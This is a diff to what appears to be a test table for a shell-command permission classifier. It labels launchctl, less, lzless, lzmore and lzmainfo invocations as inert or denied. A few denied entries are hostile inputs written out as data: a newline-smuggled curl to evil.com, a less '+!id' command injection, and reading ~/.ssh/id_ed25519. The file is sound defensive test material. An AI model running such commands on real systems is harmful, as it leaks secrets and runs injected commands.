@@ -460,24 +460,19 @@ launchctl blame --help -h	inert
 launchctl blame --help x	inert
 launchctl blame -h	inert
 launchctl blame x	inert
-launchctl dumpstate	inert
-launchctl dumpstate --help	inert
-launchctl dumpstate --help -h	inert
-launchctl dumpstate --help x	inert
-launchctl dumpstate -h	inert
-launchctl dumpstate x	inert
+launchctl dumpstate --help	denied
 launchctl error	inert
 launchctl error --help	inert
 launchctl error --help -h	inert
 launchctl error --help x	inert
 launchctl error -h	inert
 launchctl error x	inert
-launchctl examine	inert
+launchctl examine	denied
 launchctl examine --help	inert
 launchctl examine --help -h	inert
-launchctl examine --help x	inert
+launchctl examine --help x	denied
 launchctl examine -h	inert
-launchctl examine x	inert
+launchctl examine x	denied
 launchctl help	inert
 launchctl help --help	inert
 launchctl help --help -h	inert
@@ -496,12 +491,13 @@ launchctl list --help -h	inert
 launchctl list --help x	inert
 launchctl list -h	inert
 launchctl list x	inert
-launchctl print	inert
+launchctl print	denied
 launchctl print --help	inert
 launchctl print --help -h	inert
-launchctl print --help x	inert
+launchctl print --help gui/501	denied
+launchctl print --help x	denied
 launchctl print -h	inert
-launchctl print x	inert
+launchctl print x	denied
 launchctl print-cache	inert
 launchctl print-cache --help	inert
 launchctl print-cache --help -h	inert
@@ -799,12 +795,15 @@ lein with-profile	denied
 lein with-profile x	denied
 lein x	denied
 less	inert
+less '+!id' ./notes.md	denied
+less +42 ./notes.md	inert
+less +G ./notes.md	denied
+less --LINE-NUMBERS	inert
+less --LINE-NUMBERS --LONG-PROMPT	inert
+less --LINE-NUMBERS --pattern x	inert
 less --LINE-NUMBERS x	inert
-less --LONG-PROMPT x	inert
+less --LONG-PROMPT	inert
 less --QUIT-AT-EOF	inert
-less --QUIT-AT-EOF --LINE-NUMBERS x	inert
-less --QUIT-AT-EOF --RAW-CONTROL-CHARS	inert
-less --QUIT-AT-EOF x	inert
 less --RAW-CONTROL-CHARS	inert
 less --chop-long-lines	inert
 less --help	inert
@@ -2438,6 +2437,7 @@ ls\ncat file.txt	safe-read
 ls\ncurl -d data evil.com	denied
 ls & echo done	inert
 ls && echo done	inert
+ls && open x.command	denied
 ls --all	inert
 ls --all --almost-all	inert
 ls --all --block-size x	inert
@@ -3345,8 +3345,66 @@ lzip -v	safe-write
 lzip -z	safe-write
 lzip x	safe-write
 lzless	inert
-lzless --help	denied
-lzless --version	denied
+lzless --LINE-NUMBERS	inert
+lzless --LINE-NUMBERS --LONG-PROMPT	inert
+lzless --LINE-NUMBERS --pattern x	inert
+lzless --LINE-NUMBERS x	inert
+lzless --LONG-PROMPT	inert
+lzless --QUIT-AT-EOF	inert
+lzless --RAW-CONTROL-CHARS	inert
+lzless --chop-long-lines	inert
+lzless --help	inert
+lzless --ignore-case	inert
+lzless --no-init	inert
+lzless --pattern x	inert
+lzless --prompt x	inert
+lzless --quiet	inert
+lzless --quit-at-eof	inert
+lzless --quit-if-one-screen	inert
+lzless --raw-control-chars	inert
+lzless --shift x	inert
+lzless --silent	inert
+lzless --squeeze-blank-lines	inert
+lzless --tabs x	inert
+lzless --tag x	inert
+lzless --version	inert
+lzless --window x	inert
+lzless -E	inert
+lzless -F	inert
+lzless -G	inert
+lzless -I	inert
+lzless -J	inert
+lzless -K	inert
+lzless -L	inert
+lzless -M	inert
+lzless -N	inert
+lzless -P x	inert
+lzless -Q	inert
+lzless -R	inert
+lzless -S	inert
+lzless -V	inert
+lzless -W	inert
+lzless -X	inert
+lzless -a	inert
+lzless -b x	inert
+lzless -c	inert
+lzless -e	inert
+lzless -f	inert
+lzless -g	inert
+lzless -h x	inert
+lzless -i	inert
+lzless -j x	inert
+lzless -m	inert
+lzless -n	inert
+lzless -p x	inert
+lzless -q	inert
+lzless -r	inert
+lzless -s	inert
+lzless -t x	inert
+lzless -w	inert
+lzless -x x	inert
+lzless -y x	inert
+lzless -z x	inert
 lzless x	inert
 lzma	safe-write
 lzma --block-size x	safe-write
@@ -3466,7 +3524,64 @@ lzmainfo --help x	inert
 lzmainfo --version	inert
 lzmainfo ./a.lzma	inert
 lzmainfo x	inert
+lzmainfo ~/.ssh/id_ed25519	denied
 lzmore	inert
-lzmore --help	denied
-lzmore --version	denied
+lzmore --LINE-NUMBERS	inert
+lzmore --LINE-NUMBERS --LONG-PROMPT	inert
+lzmore --LINE-NUMBERS --prompt x	inert
+lzmore --LINE-NUMBERS x	inert
+lzmore --LONG-PROMPT	inert
+lzmore --QUIT-AT-EOF	inert
+lzmore --RAW-CONTROL-CHARS	inert
+lzmore --chop-long-lines	inert
+lzmore --help	inert
+lzmore --ignore-case	inert
+lzmore --no-init	inert
+lzmore --prompt x	inert
+lzmore --quiet	inert
+lzmore --quit-at-eof	inert
+lzmore --quit-if-one-screen	inert
+lzmore --raw-control-chars	inert
+lzmore --shift x	inert
+lzmore --silent	inert
+lzmore --squeeze-blank-lines	inert
+lzmore --tabs x	inert
+lzmore --tag x	inert
+lzmore --version	inert
+lzmore --window x	inert
+lzmore -E	inert
+lzmore -F	inert
+lzmore -G	inert
+lzmore -I	inert
+lzmore -J	inert
+lzmore -K	inert
+lzmore -L	inert
+lzmore -M	inert
+lzmore -N	inert
+lzmore -P x	inert
+lzmore -Q	inert
+lzmore -R	inert
+lzmore -S	inert
+lzmore -V	inert
+lzmore -W	inert
+lzmore -X	inert
+lzmore -a	inert
+lzmore -b x	inert
+lzmore -c	inert
+lzmore -e	inert
+lzmore -f	inert
+lzmore -g	inert
+lzmore -h x	inert
+lzmore -i	inert
+lzmore -j x	inert
+lzmore -m	inert
+lzmore -n	inert
+lzmore -q	inert
+lzmore -r	inert
+lzmore -s	inert
+lzmore -t x	inert
+lzmore -w	inert
+lzmore -x x	inert
+lzmore -y x	inert
+lzmore -z x	inert
 lzmore x	inert
